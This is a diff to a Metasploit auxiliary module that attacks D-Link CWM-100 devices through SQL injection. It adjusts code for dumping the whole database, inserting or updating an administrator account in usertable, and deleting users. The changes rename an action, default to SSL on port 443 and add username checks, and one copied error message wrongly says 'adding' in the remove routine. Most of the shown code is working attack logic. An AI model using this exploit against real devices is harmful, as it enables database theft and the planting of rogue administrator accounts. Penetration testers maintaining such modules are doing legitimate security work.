@@ -36,15 +36,17 @@ class MetasploitModule < Msf::Auxiliary
           [
             [ 'SQLI_DUMP', 'Description' => 'Retrieve all the data from the database' ],
             [ 'ADD_ADMIN', 'Description' => 'Add an administrator user' ],
-            [ 'REMOVE_USER', 'Description' => 'Remove a user' ]
+            [ 'REMOVE_ADMIN', 'Description' => 'Remove an administrator user' ]
           ],
+        'DefaultOptions' => { 'SSL' => true },
         'DefaultAction' => 'SQLI_DUMP',
-        'DisclosureDate' => 'July 06 2019'
+        'DisclosureDate' => 'Jul 06 2019'
       )
     )
 
     register_options(
       [
+        Opt::RPORT(443),
         OptString.new('TARGETURI', [true, 'The base path to DLink CWM-100', '/']),
         OptString.new('Admin_Username', [false, 'The username of the user to add/remove']),
         OptString.new('Admin_Password', [false, 'The password of the user to add/edit'])
@@ -53,8 +55,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    # Check version
-    print_status('Trying to detect installed version')
     @sqli = create_sqli(dbms: PostgreSQLi::Common, opts: { encoder: :base64 }) do |payload|
       res = send_request_cgi(
         'method' => 'POST',
@@ -113,12 +113,15 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def add_user
-    admin_hash = Digest::MD5.hexdigest(datastore['Admin_Password'])
+    if datastore['Admin_Username'].nil?
+      fail_with Failure::BadConfig, 'You must specify a username when adding a user'
+    end
+    admin_hash = Digest::MD5.hexdigest(datastore['Admin_Password'] || '')
     user_exists_sql = "select count(1) from usertable where username='#{datastore['Admin_Username']}'"
     # check if user exists, if yes, just change his password
     if @sqli.run_sql(user_exists_sql).to_i == 0
       print_status 'User not found on the target, inserting'
-      @sqli.run_sql("insert into usertable(username,userpassword,level) values(" \
+      @sqli.run_sql('insert into usertable(username,userpassword,level) values(' \
       "'#{datastore['Admin_Username']}', '#{admin_hash}', 1)")
     else
       print_status 'User already exists, updating the password'
@@ -128,6 +131,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def remove_user
+    if datastore['Admin_Username'].nil?
+      fail_with Failure::BadConfig, 'You must specify a username when adding a user'
+    end
     @sqli.run_sql("delete from usertable where username='#{datastore['Admin_Username']}'")
   end
 
@@ -140,7 +146,7 @@ class MetasploitModule < Msf::Auxiliary
     case action.name
     when 'SQLI_DUMP' then perform_sqli
     when 'ADD_ADMIN' then add_user
-    when 'REMOVE_USER' then remove_user
+    when 'REMOVE_ADMIN' then remove_user
     else
       fail_with(Failure::BadConfig, "#{action.name} not defined")
     end
